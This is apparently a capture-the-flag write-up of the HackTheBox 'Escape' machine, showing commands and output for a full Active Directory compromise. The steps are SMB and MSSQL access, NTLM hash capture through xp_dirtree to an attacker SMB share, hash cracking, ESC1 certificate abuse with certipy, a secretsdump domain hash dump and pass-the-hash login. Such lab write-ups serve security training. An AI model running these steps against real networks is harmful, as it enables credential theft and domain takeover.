---
title: "Escape"
date: 2025-05-05
categories:
  - HackTheBox
  - Active Directory
tags:
  - HackTheBox
  - Active Directory
---

# Escape

![](../assets/Pasted%20image%2020250505213226.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.202
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 21:33 CEST
Nmap scan report for 10.10.11.202
Host is up (0.041s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-06 03:33:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-06T03:35:11+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-06T03:35:11+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-05-06T03:35:11+00:00; +8h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-05T01:14:52
|_Not valid after:  2055-05-05T01:14:52
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-05-06T03:35:11+00:00; +8h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-05-06T03:35:11+00:00; +8h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
```

Enter anonymously in the `Public` share and get the PDF.

```shell
$ smbclient -U '' //10.10.11.202/Public
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

                5184255 blocks of size 4096. 1430985 blocks available
smb: \> get "sql server procedures.pdf"
getting file \sql server procedures.pdf of size 49551 as sql server procedures.pdf (234.9 KiloBytes/sec) (average 234.9 KiloBytes/sec)
smb: \> exit
```

![](../assets/Pasted%20image%2020250505214426.png)

So we have a `brandon` user with `brandon.brown@sequel.htb` and `PublicUser:GuestUserCantWrite1`.

Using those credentials, enter the instance.

```shell
$ impacket-mssqlclient sequel.htb/publicuser:'GuestUserCantWrite1'@10.10.11.202
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```

We can perform a `UNC` attack to get the `NTLM` hash.

```shell
SQL (PublicUser  guest@master)> exec master.dbo.xp_dirtree '\\10.10.14.13\asdf'
subdirectory   depth   
```

```shell
$ impacket-smbserver -smb2support kali .   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,62990)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:1295801fe2a8d14070d75cab06076b69:010100000000000000235fc909bedb013b3503531870fc9f00000000010010006d0044005900650050004e0045004200030010006d0044005900650050004e0045004200020010004f00570050007900550061007a005200040010004f00570050007900550061007a0052000700080000235fc909bedb01060004000200000008003000300000000000000000000000003000002fd21b6e1d9e5e2f0899c98a2190b46d2ec5e7edea24dfbf9b02f1b91ffe0c540a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310033000000000000000000
[*] Closing down connection (10.10.11.202,62990)
[*] Remaining connections []
```

Using `hashcat`:

```shell
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force 
hashcat (v6.2.6) starting
...
SQL_SVC::sequel:aaaaaaaaaaaaaaaa:1295801fe2a8d14070d75cab06076b69:010100000000000000235fc909bedb013b3503531870fc9f00000000010010006d0044005900650050004e0045004200030010006d0044005900650050004e0045004200020010004f00570050007900550061007a005200040010004f00570050007900550061007a0052000700080000235fc909bedb01060004000200000008003000300000000000000000000000003000002fd21b6e1d9e5e2f0899c98a2190b46d2ec5e7edea24dfbf9b02f1b91ffe0c540a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310033000000000000000000:REGGIE1234ronnie
```

We can get all users.

![](../assets/Pasted%20image%2020250506001538.png)

## Initial Access

This user can access `winrm` on the host.

![](../assets/Pasted%20image%2020250506002415.png)

```shell
$ evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie                     

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
```

## Privilege Escalation

Searching in `C:\` there is a `sqlserver` folder, and inside there are the logs.

```shell
*Evil-WinRM* PS C:\sqlserver> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe

*Evil-WinRM* PS C:\sqlserver> cd logs
*Evil-WinRM* PS C:\sqlserver\logs> ls

    Directory: C:\sqlserver\logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK

*Evil-WinRM* PS C:\sqlserver\logs> type errorlog.bak
2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)

...
2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the logovided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login pro. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute ex
```

It seems that `ryan.cooper` entered his password instead of the username, so `ryan.cooper:NuclearMosquito3`.

![](../assets/Pasted%20image%2020250506003724.png)

```shell
$ evil-winrm -i 10.10.11.202 -u ryan.cooper -p NuclearMosquito3
                              
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
```

Get the flag.

```shell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\desktop> type user.txt
79eb702b385547cbb18f054fa9246173
```

Transfer `adPEAS` to the host.

![](../assets/Pasted%20image%2020250506091431.png)

The template has the `ENROLLEE_SUPPLIES_SUBJECT` flag; using [`certipy`](https://github.com/ly4k/Certipy) we can exploit this. ([reference](https://redfoxsec.com/blog/exploiting-misconfigured-active-directory-certificate-template-esc1/))

```shell
$ certipy-ad find -vulnerable -dc-ip 10.10.11.202 -u ryan.cooper@sequel.htb -p 'NuclearMosquito3'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
[*] Got CA configuration for 'sequel-DC-CA'
[*] Saved BloodHound data to '20250506093829_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250506093829_Certipy.txt'
[*] Saved JSON output to '20250506093829_Certipy.json'
                                                                                
$ cat 20250506093829_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

Request a certificate with the admin `SAN`.

```shell
$ certipy-ad req -dc-ip 10.10.11.202 -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -ca sequel-DC-CA -target DC.sequel.htb -template UserAuthentication -upn Administrator@sequel.htb -dns DC.sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence '\('
  "(0x[a-zA-Z0-9]+) \([-]?[0-9]+ ",
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 23
[*] Got certificate with multiple identifications
    UPN: 'Administrator@sequel.htb'
    DNS Host Name: 'DC.sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_dc.pfx'
```

Authenticate against the `DC` using the admin cert.

```shell
$ certipy-ad auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'Administrator@sequel.htb'
    [1] DNS Host Name: 'DC.sequel.htb'
> 1
[*] Using principal: dc$@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dc.ccache'
[*] Trying to retrieve NT hash for 'dc$'
[*] Got hash for 'dc$@sequel.htb': aad3b435b51404eeaad3b435b51404ee:db6875e6546cf4e2ebb1d309a94bcdb6
```

Now dump the hashes and `LSA` secrets using `secretsdump`.

```shell
$ impacket-secretsdump -hashes 'aad3b435b51404eeaad3b435b51404ee:db6875e6546cf4e2ebb1d309a94bcdb6' 'sequel.htb/dc$@10.10.11.202'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
Tom.Henn:1103:aad3b435b51404eeaad3b435b51404ee:22e99d2b3043bbb0a480705c9b0e71ac:::
Brandon.Brown:1104:aad3b435b51404eeaad3b435b51404ee:f562f509ad646c666f83b45f90a58af3:::
Ryan.Cooper:1105:aad3b435b51404eeaad3b435b51404ee:98981eed8e9ce0763bb3c5b3c7ed5945:::
sql_svc:1106:aad3b435b51404eeaad3b435b51404ee:1443ec19da4dac4ffc953bca1b57b4cf:::
James.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:cc69ea05e9ab430702679d5706b39075:::
Nicole.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:235da7fbef7d0861301b4078d56afdc5:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:db6875e6546cf4e2ebb1d309a94bcdb6:::
...
...
[*] Cleaning up... 
```

Using `evil-winrm`, enter the `DC`.

```shell
$ evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\desktop> whoami
sequel\administrator
```

## Post Exploitation

Get the flag.

```shell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
770c060ea664ba5922aee6a3f46a6322
```
